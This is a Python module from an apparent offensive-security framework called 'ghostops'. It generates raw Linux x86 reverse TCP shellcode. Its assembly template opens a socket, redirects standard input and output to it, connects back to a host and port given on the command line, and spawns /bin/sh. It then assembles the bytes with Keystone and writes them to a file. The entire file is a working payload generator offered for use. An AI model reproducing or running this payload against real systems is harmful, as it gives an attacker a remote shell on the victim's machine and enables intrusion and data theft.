from keystone import Ks, KS_ARCH_X86, KS_MODE_32, KsError
from ghostops.core.module_base import BaseModule
from ghostops.core.utils import Logger
from pathlib import Path


class LinuxX86ShellReverseTcp(BaseModule):
    """
    Module to generate a raw reverse TCP shellcode payload targeting Linux x86.

    This payload connects back to a specified IPv4 host and port.
    """

    module_name = "LinuxX86ReverseTcp"
    module_description = "Generates reverse TCP payload targeting Linux x86 platforms."
    module_author = "Awagat Dhungana <4w4647@gmail.com>"
    module_category = "payload"
    module_target_os = ["linux"]
    module_target_architecture = ["x86"]

    @staticmethod
    def add_arguments(parser) -> None:
        """
        Adds CLI arguments for host, port, and output file.

        Args:
            parser (argparse.ArgumentParser): Argument parser instance.
        """
        parser.add_argument(
            "--host", required=True, type=str, help="Target IPv4 address"
        )
        parser.add_argument(
            "--port", required=True, type=int, help="Target port number"
        )
        parser.add_argument(
            "--output",
            required=True,
            type=str,
            help="Output filename for raw shellcode (e.g., ghostops.bin)",
        )

    @staticmethod
    def host_to_hex(host: str) -> str:
        """
        Convert IPv4 address string to reversed hex (little-endian) format.

        Args:
            host (str): IPv4 address string (e.g., "192.168.1.1").

        Returns:
            str: Little-endian hex string of IP address.

        Raises:
            ValueError: If input is not a valid IPv4 address.
        """
        try:
            octets = host.split(".")
            if len(octets) != 4:
                raise ValueError("Invalid IPv4 address format")
            return "".join(f"{int(octet):02x}" for octet in reversed(octets))
        except Exception as e:
            Logger.log("flaw", f"Invalid host '{host}': {e}")
            raise

    @staticmethod
    def port_to_hex(port: int) -> str:
        """
        Convert port number to little-endian hex string.

        Args:
            port (int): TCP port number (1-65535).

        Returns:
            str: Little-endian hex string representation of port.

        Raises:
            ValueError: If port is out of range.
        """
        if not (0 < port < 65536):
            raise ValueError(f"Port must be between 1 and 65535, got {port}")
        return f"{port & 0xFF:02x}{(port >> 8) & 0xFF:02x}"

    @staticmethod
    def main(args) -> None:
        """
        Assemble shellcode and write raw bytes to output file.

        Args:
            args: Parsed CLI arguments.
        """
        Logger.log("info", f"HOST {args.host}")
        Logger.log("info", f"PORT {args.port}")
        print()

        try:
            host_hex = LinuxX86ShellReverseTcp.host_to_hex(args.host)
            port_hex = LinuxX86ShellReverseTcp.port_to_hex(args.port)
        except Exception:
            Logger.log("flaw", "Invalid host or port provided.")
            return

        shellcode_template = f"""
        xor    ebx,ebx
        mul    ebx
        push   ebx
        inc    ebx
        push   ebx
        push   0x2
        mov    ecx,esp
        mov    al,0x66
        int    0x80
        xchg   ebx,eax
        pop    ecx
        mov    al,0x3f
        int    0x80
        dec    ecx
        jns    0x11
        push   0x{host_hex}
        push   0x{port_hex}0002
        mov    ecx,esp
        mov    al,0x66
        push   eax
        push   ecx
        push   ebx
        mov    bl,0x3
        mov    ecx,esp
        int    0x80
        push   edx
        push   0x68732f6e
        push   0x69622f2f
        mov    ebx,esp
        push   edx
        push   ebx
        mov    ecx,esp
        mov    al,0xb
        int    0x80
        """

        try:
            ks = Ks(KS_ARCH_X86, KS_MODE_32)
            encoding, _ = ks.asm(shellcode_template)
        except KsError as e:
            Logger.log("flaw", f"Assembly failed: {e}")
            return

        shellcode_bytes = bytes(encoding)
        Logger.log("good", f"Shellcode size: {len(shellcode_bytes)} bytes")

        output_path = Path(args.output)
        try:
            with open(output_path, "wb") as f:
                f.write(shellcode_bytes)
            Logger.log("good", f"Raw shellcode written to {output_path}")
        except Exception as e:
            Logger.log("flaw", f"Failed to write shellcode to file: {e}")
